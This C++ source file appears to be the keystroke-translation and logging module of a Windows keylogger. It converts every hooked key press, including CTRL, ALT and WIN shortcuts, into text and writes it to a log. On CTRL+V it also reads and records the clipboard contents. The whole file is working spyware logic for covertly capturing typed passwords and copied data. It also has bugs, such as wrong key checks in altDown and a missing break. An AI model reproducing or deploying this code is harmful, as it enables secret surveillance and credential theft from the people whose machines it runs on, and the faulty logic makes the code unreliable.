#include "keycode_map.h"
#include "../libraries/fileio.h"
#include "keyboard_hook.h"
#include "keycode_constants.h"

/*
    Get the contents of the clipboard
*/
std::string GetClipboardText()
{
    std::string emptyString = "";
  // Try opening the clipboard
  if (! OpenClipboard(NULL)){
        return emptyString;
  }

  // Get handle of clipboard object for ANSI text
  HANDLE hData = GetClipboardData(CF_TEXT);
  if (hData == NULL){
        return emptyString;
  }

  // Lock the handle to get the actual text pointer
  char * pszText = static_cast<char*>( GlobalLock(hData) );
  if (pszText == NULL){
        return emptyString;
  }

  // Save text in a string class instance
  std::string text( pszText );

  // Release the lock
  GlobalUnlock( hData );

  // Release the clipboard
  CloseClipboard();

  return text;
}

/*
    Log the contents of the clipboard
*/
void logClipboardCts(){
    std::string clipBoard = GetClipboardText();
    secLine(true);
    writeLine( "Clipboard Contents" );
    secLine(true);
    writeLine( (char*)clipBoard.c_str() );
    secLine(true);
}



/**
If the shift key is down, that means we need to capitalize
letters, or find the special character associated with pressing shift.
*/
bool shiftDown(DWORD keyCode){

    bool kdvkls = false;
    bool kdvkrs = false;
    bool kcvkls = false;
    bool kcvkrs = false;

    if (keyDown(VK_LSHIFT))
    {
        kdvkls = true;
    }
    if (keyDown(VK_RSHIFT))
    {
        kdvkrs = true;
    }
    if (keyCode == VK_LSHIFT)
    {
        kcvkls = true;
    }
    if (keyCode == VK_RSHIFT)
    {
        kcvkrs = true;
    }

    // If shift is down, we want to add an offset to the virtual
    // key code to map to the key that was pressed
    if ( ( kdvkls || kdvkrs) && kcvkls == false && kcvkrs == false )
    {
        return true;
    }else{
        return false;
    }
}

/*
    We want to know if CTRL is down so we can capture known Windows keyboard shortcuts
*/
bool ctrlDown( DWORD keyCode) {

    bool kdvklc = false;
    bool kdvkrc = false;
    bool kcvklc = false;
    bool kcvkrc = false;

    if ( keyDown( VK_RCONTROL ) ){
        kdvkrc = true;
    }
    if( keyDown( VK_LCONTROL ) ){
        kdvklc = true;
    }
    if (keyCode == VK_LCONTROL)
    {
        kcvklc = true;
    }
    if (keyCode == VK_RCONTROL)
    {
        kcvkrc = true;
    }

    if ( ( kdvklc || kdvkrc ) && kcvklc == false && kcvkrc == false )
    {
        return true;
    }else{
        return false;
    }
}

/*
    Check if the Windows key is down so we can capture known Windows shortcuts
*/

bool wndDown( DWORD keyCode) {

    bool kdvklw = false;
    bool kdvkrw = false;
    bool kcvklw = false;
    bool kcvkrw = false;

    if ( keyDown( VK_RWIN ) ){
        kdvkrw = true;
    }
    if( keyDown( VK_LWIN ) ){
        kdvklw = true;
    }
    if (keyCode == VK_LWIN)
    {
        kcvklw = true;
    }
    if (keyCode == VK_RWIN)
    {
        kcvkrw = true;
    }

    if ( ( kdvklw || kdvkrw ) && kcvklw == false && kcvkrw == false )
    {
        return true;
    }else{
        return false;
    }
}

/*
    Is ALT down?  Gotta keep grabbing those keyboard shortcuts.
*/
bool altDown( DWORD keyCode) {

    bool kdvkla = false;
    bool kdvkra = false;
    bool kcvkla = false;
    bool kcvkra = false;

    if ( keyDown( VK_RMENU ) ){
        kdvkra = true;
    }
    if( keyDown( VK_LMENU ) ){
        kdvkla = true;
    }
    if (keyCode == VK_LWIN)
    {
        kcvkla = true;
    }
    if (keyCode == VK_LMENU)
    {
        kcvkra = true;
    }

    if ( ( kdvkla || kdvkra ) && kcvkla == false && kcvkra == false )
    {
        return true;
    }else{
        return false;
    }
}

void getStatusOfKeys(DWORD keyCode, char* asciiChar)
{
    /**
    If CTRL down, determine what shortcut that is and return that.
    If ALT down, determine shortcut and return that.
    If CAPSLOCK is on, respond accordingly.
    */

    bool ctrlDn = ctrlDown( keyCode );
    bool shiftDn = shiftDown( keyCode );
    bool wndDn = wndDown( keyCode );
    bool altDn = altDown( keyCode );
    bool logClipboard = false;

    if( shiftDn == true ){
        keyCode+=SHIFT_DELTA;
    }

    switch (keyCode)
    {
    case VK_EXCLAMATION:
        strcpy(asciiChar,"!");
        break;
    case VK_ATSYM:
        strcpy(asciiChar,"@");
        break;
    case VK_POUND:
        strcpy(asciiChar,"#");
        break;
    case VK_DOLLAR:
        strcpy(asciiChar,"$");
        break;
    case VK_PERCENT:
        strcpy(asciiChar,"%");
        break;
    case VK_CARET:
        strcpy(asciiChar,"^");
        break;
    case VK_AMP:
        strcpy(asciiChar,"&");
        break;
    case VK_ASTERISK:
        strcpy(asciiChar,"*");
        break;
    case VK_LPAREN:
        strcpy(asciiChar,"(");
        break;
    case VK_RPAREN:
        strcpy(asciiChar,")");
        break;
    case VK_ONE:
        strcpy(asciiChar,"1");
        break;
    case VK_TWO:
        strcpy(asciiChar,"2");
        break;
    case VK_THREE:
        strcpy(asciiChar,"3");
        break;
    case VK_FOUR:
        strcpy(asciiChar,"4");
        break;
    case VK_FIVE:
        strcpy(asciiChar,"5");
        break;
    case VK_SIX:
        strcpy(asciiChar,"6");
        break;
    case VK_SEVEN:
        strcpy(asciiChar,"7");
        break;
    case VK_EIGHT:
        strcpy(asciiChar,"8");
        break;
    case VK_NINE:
        strcpy(asciiChar,"9");
        break;
    case VK_ZERO:
        strcpy(asciiChar,"0");
        break;
    case VK_LEFTCURLY:
        strcpy(asciiChar,"{");
        break;
    case VK_PIPE:
        strcpy(asciiChar,"|");
        break;
    case VK_RIGHTCURLY:
        strcpy(asciiChar,"}");
        break;
    case VK_DOUBLEQUOTE:
        strcpy(asciiChar,"\"");
        break;
    case VK_BACKSLASH:
        strcpy(asciiChar,"\\");
        break;
    case VK_RIGHTSQUARE:
        strcpy(asciiChar,"]");
        break;
    case VK_LEFTSQUARE:
        strcpy(asciiChar,"[");
        break;
    case VK_TICK:
        strcpy(asciiChar,"'");
        break;
    case VK_COLON:
        strcpy(asciiChar,":");
        break;
    case VK_PLUS:
        strcpy(asciiChar,"+");
        break;
    case VK_LESSTHAN:
        strcpy(asciiChar,"<");
        break;
    case VK_UNDERSCORE:
        strcpy(asciiChar,"_");
        break;
    case VK_GREATERTHAN:
        strcpy(asciiChar,">");
        break;
    case VK_SEMICOLON:
        strcpy(asciiChar,";");
        break;
    case VK_EQUALS:
        strcpy(asciiChar,"=");
        break;
    case VK_COMMA:
        strcpy(asciiChar,",");
        break;
    case VK_HYPHEN:
        strcpy(asciiChar,"-");
        break;
    case VK_PERIOD:
        strcpy(asciiChar,".");
        break;
    case VK_FSLASH:
        strcpy(asciiChar,"/");
        break;
    case VK_QUESTION:
        strcpy(asciiChar,"?");
        break;
    case VK_BACKTICK:
        strcpy(asciiChar,"`");
        break;
    case VK_OEM_8:
        strcpy(asciiChar,"8");
        break;
    case VK_RMENU:
        strcpy(asciiChar,"\r\n[Right ALT]\r\n");
        break;
    case VK_LMENU:
        strcpy(asciiChar,"\r\n[Left ALT]\r\n");
        break;
    case VK_RCONTROL:
        strcpy(asciiChar,"\r\n[Right CTRL]\r\n");
        break;
    case VK_LCONTROL:
        strcpy(asciiChar,"\r\n[Left CTRL]\r\n");
        break;
    case VK_SCROLL:
        strcpy(asciiChar,"\r\n[SCROLL]\r\n");
        break;
    case VK_NUMLOCK:
        strcpy(asciiChar,"\r\n[NUM LOCK]\r\n");
        break;
    case VK_F12:
        strcpy(asciiChar,"\r\n[F12]\r\n");
        break;
    case VK_F11:
        strcpy(asciiChar,"\r\n[F11]\r\n");
        break;
    case VK_F10:
        strcpy(asciiChar,"\r\n[F10]\r\n");
        break;
    case VK_F9:
        strcpy(asciiChar,"\r\n[F9]\r\n");
        break;
    case VK_F8:
        strcpy(asciiChar,"\r\n[F8]\r\n");
        break;
    case VK_F7:
        strcpy(asciiChar,"\r\n[F7]\r\n");
        break;
    case VK_F6:
        strcpy(asciiChar,"\r\n[F6]\r\n");
        break;
    case VK_F5:
        strcpy(asciiChar,"\r\n[F5]\r\n");
        break;
    case VK_F4:
        if( altDn ){
            strcpy( asciiChar, "\r\n[ALT+F4 - CLOSE APPLICATION]\r\n" );
        }else{
            strcpy(asciiChar,"\r\n[F4]\r\n");
        }
        break;
    case VK_F3:
        strcpy(asciiChar,"\r\n[F3]\r\n");
        break;
    case VK_F2:
        strcpy(asciiChar,"\r\n[F2]\r\n");
        break;
    case VK_F1:
        strcpy(asciiChar,"\r\n[F1]\r\n");
        break;
    case VK_DIVIDE:
        strcpy(asciiChar,"/");
        break;
    case VK_DECIMAL:
        strcpy(asciiChar,".");
        break;
    case VK_SUBTRACT:
        strcpy(asciiChar,"-");
        break;
    case VK_SEPARATOR:
        strcpy(asciiChar,"\r\n[SEPARATOR]\r\n");
        break;
    case VK_ADD:
        strcpy(asciiChar,"+");
        break;
    case VK_MULTIPLY:
        strcpy(asciiChar,"*");
        break;
    case VK_NUMPAD9:
        strcpy(asciiChar,"\r\n[PAD 9]\r\n");
        break;
    case VK_NUMPAD8:
        strcpy(asciiChar,"\r\n[PAD 8]\r\n");
        break;
    case VK_NUMPAD7:
        strcpy(asciiChar,"\r\n[PAD 7]\r\n");
        break;
    case VK_NUMPAD6:
        strcpy(asciiChar,"\r\n[PAD 6]\r\n");
        break;
    case VK_NUMPAD5:
        strcpy(asciiChar,"\r\n[PAD 5]\r\n");
        break;
    case VK_NUMPAD4:
        strcpy(asciiChar,"\r\n[PAD 4]\r\n");
        break;
    case VK_NUMPAD3:
        strcpy(asciiChar,"\r\n[PAD 3]\r\n");
        break;
    case VK_NUMPAD2:
        strcpy(asciiChar,"\r\n[PAD 2]\r\n");
        break;
    case VK_NUMPAD1:
        strcpy(asciiChar,"\r\n[PAD 1]\r\n");
        break;
    case VK_NUMPAD0:
        strcpy(asciiChar,"\r\n[PAD 0]\r\n");
        break;
    case VK_SLEEP:
        strcpy(asciiChar,"\r\n[SLEEP]\r\n");
        break;
    case VK_APPS:
        strcpy(asciiChar,"\r\n[APPS]\r\n");
        break;
    case VK_RWIN:
        strcpy(asciiChar,"\r\n[RIGHT_WIN]\r\n");
        break;
    case VK_LWIN:
        strcpy(asciiChar,"\r\n[LEFT_WIN]\r\n");
        break;
    case VK_HELP:
        strcpy(asciiChar,"\r\n[HELP]\r\n");
        break;
    case VK_DELETE:
        strcpy(asciiChar,"\r\n[DEL]\r\n");
        break;
    case VK_INSERT:
        strcpy(asciiChar,"\r\n[INSERT]\r\n");
        break;
    case VK_SNAPSHOT:
        strcpy(asciiChar,"\r\n[SNAPSHOT]\r\n");
        break;
    case VK_EXECUTE:
        strcpy(asciiChar,"\r\n[EXECUTE]\r\n");
        break;
    case VK_PRINT:
        strcpy(asciiChar,"\r\n[PRINT]\r\n");
        break;
    case VK_SELECT:
        strcpy(asciiChar,"\r\n[SELECT]\r\n");
        break;
    case VK_DOWN:
        strcpy(asciiChar,"\r\n[DOWN]\r\n");
        break;
    case VK_RIGHT:
        strcpy(asciiChar,"\r\n[RIGHT]\r\n");
        break;
    case VK_UP:
        strcpy(asciiChar,"\r\n[UP]\r\n");
        break;
    case VK_LEFT:
        strcpy(asciiChar,"\r\n[LEFT]\r\n");
        break;
    case VK_HOME:
        strcpy(asciiChar,"\r\n[HOME]\r\n");
        break;
    case VK_END:
        strcpy(asciiChar,"\r\n[END]\r\n");
        break;
    case VK_NEXT:
        strcpy(asciiChar,"\r\n[PG_DOWN]\r\n");
        break;
    case VK_PRIOR:
        strcpy(asciiChar,"\r\n[PG_UP]\r\n");
        break;
    case VK_ESCAPE:
        strcpy(asciiChar,"\r\n[ESC]\r\n");
        break;
    case VK_CAPITAL:
        strcpy(asciiChar,"\r\n[CAPITAL]\r\n");
        break;
    case VK_PAUSE:
        strcpy(asciiChar,"\r\n[PAUSE]\r\n");
        break;
    case VK_MENU:
        strcpy(asciiChar,"\r\n[MENU]\r\n");
        break;
    case VK_SPACE:
        strcpy(asciiChar," ");
        break;
    case VK_RETURN:
        strcpy(asciiChar,"\r\n");
        break;
    case VK_TAB:
        strcpy(asciiChar,"\r\n[TAB]\r\n");
        break;
    case VK_BACK:
        strcpy(asciiChar,"\r\n[<=]\r\n");
        break;
    case VK_A:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+A - SELECT ALL]\r\n" );
        }else{
            strcpy(asciiChar,"a");
        }
        break;
    case VK_B:
        strcpy(asciiChar,"b");
        break;
    case VK_C:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+C - COPY TO CLIPBOARD]\r\n" );
        }else{
            strcpy(asciiChar,"c");
        }
        break;
    case VK_D:
        if( wndDn ){
            strcpy( asciiChar, "\r\n[WND+D - MINIMIZE ALL WINDOWS]\r\n" );
        }else{
            strcpy(asciiChar,"d");
        }
        break;
    case VK_E:
        strcpy(asciiChar,"e");
        break;
    case VK_F:
        strcpy(asciiChar,"f");
        break;
    case VK_G:
        strcpy(asciiChar,"g");
        break;
    case VK_H:
        strcpy(asciiChar,"h");
        break;
    case VK_I:
        strcpy(asciiChar,"i");
        break;
    case VK_J:
        strcpy(asciiChar,"j");
        break;
    case VK_K:
        strcpy(asciiChar,"k");
        break;
    case VK_L:
        strcpy(asciiChar,"l");
        break;
    case VK_M:
        strcpy(asciiChar,"m");
        break;
    case VK_N:
        strcpy(asciiChar,"n");
        break;
    case VK_O:
        strcpy(asciiChar,"o");
        break;
    case VK_P:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+P - PRINT]\r\n" );
        }else{
            strcpy(asciiChar,"p");
        }
        break;
    case VK_Q:
        strcpy(asciiChar,"q");
        break;
    case VK_R:
        if( wndDn ){
            strcpy( asciiChar, "\r\n[WND+R - RUN A COMMAND]\r\n" );
        }else{
            strcpy(asciiChar,"r");
        }
        break;
    case VK_S:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+S - SAVE]\r\n" );
        }else{
            strcpy(asciiChar,"s");
        }
        break;
    case VK_T:
        strcpy(asciiChar,"t");
        break;
    case VK_U:
        strcpy(asciiChar,"u");
        break;
    case VK_V:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+V - PASTE FROM CLIPBOARD]\r\n" );
            logClipboard = true;
        }else{
            strcpy(asciiChar,"v");
        }
        break;
    case VK_W:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+W - CLOSE WINDOW/DOCUMENT]\r\n" );
        }else{
            strcpy(asciiChar,"w");
        }
        break;
    case VK_X:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+X - CUT TO CLIPBOARD]\r\n" );
        }else{
            strcpy(asciiChar,"x");
        }
        break;
    case VK_Y:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+Y - REDO]\r\n" );
        }else{
            strcpy(asciiChar,"y");
        }
        break;
    case VK_Z:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+Z - UNDO]\r\n" );
        }else{
            strcpy(asciiChar,"z");
        }
        break;
    case VK_CAP_A:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+A - SELECT ALL]\r\n" );
        }else{
            strcpy(asciiChar,"A");
        }
        break;
    case VK_CAP_B:
        strcpy(asciiChar,"B");
        break;
    case VK_CAP_C:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+C - COPY TO CLIPBOARD]\r\n" );
        }else{
            strcpy(asciiChar,"C");
        }
        break;
    case VK_CAP_D:
        if( wndDn ){
            strcpy( asciiChar, "\r\n[WND+D - MINIMIZE ALL WINDOWS]\r\n" );
        }else{
            strcpy(asciiChar,"D");
        }
        break;
    case VK_CAP_E:
        strcpy(asciiChar,"E");
        break;
    case VK_CAP_F:
        strcpy(asciiChar,"F");
        break;
    case VK_CAP_G:
        strcpy(asciiChar,"G");
        break;
    case VK_CAP_H:
        strcpy(asciiChar,"H");
        break;
    case VK_CAP_I:
        strcpy(asciiChar,"I");
        break;
    case VK_CAP_J:
        strcpy(asciiChar,"J");
        break;
    case VK_CAP_K:
        strcpy(asciiChar,"K");
        break;
    case VK_CAP_L:
        strcpy(asciiChar,"L");
        break;
    case VK_CAP_M:
        strcpy(asciiChar,"M");
        break;
    case VK_CAP_N:
        strcpy(asciiChar,"N");
        break;
    case VK_CAP_O:
        strcpy(asciiChar,"O");
        break;
    case VK_CAP_P:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+P - PRINT]\r\n" );
        }else{
            strcpy(asciiChar,"P");
        }
        break;
    case VK_CAP_Q:
        strcpy(asciiChar,"Q");
        break;
    case VK_CAP_R:
        if( wndDn ){
            strcpy( asciiChar, "\r\n[WND+R - RUN A COMMAND]\r\n" );
        }else{
            strcpy(asciiChar,"R");
        }
        break;
    case VK_CAP_S:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+S - SAVE]\r\n" );
        }else{
            strcpy(asciiChar,"S");
        }
        break;
    case VK_CAP_T:
        strcpy(asciiChar,"T");
        break;
    case VK_CAP_U:
        strcpy(asciiChar,"U");
        break;
    case VK_CAP_V:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+V - PASTE FROM CLIPBOARD]\r\n" );
            logClipboard = true;
        }else{
            strcpy(asciiChar,"V");
        }
        break;
    case VK_CAP_W:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+W - CLOSE WINDOW/DOCUMENT]\r\n" );
        }else{
            strcpy(asciiChar,"W");
        }
    case VK_CAP_X:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+X - CUT TO CLIPBOARD]\r\n" );
        }else{
            strcpy(asciiChar,"X");
        }
        break;
    case VK_CAP_Y:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+Y - REDO]\r\n" );
        }else{
            strcpy(asciiChar,"Y");
        }
        break;
    case VK_CAP_Z:
        if( ctrlDn ){
            strcpy( asciiChar, "\r\n[CTRL+Z - UNDO]\r\n" );
        }else{
            strcpy(asciiChar,"Z");
        }
        break;
    }

    writeLine( asciiChar );

    if( logClipboard ){
        logClipboardCts();
    }
}
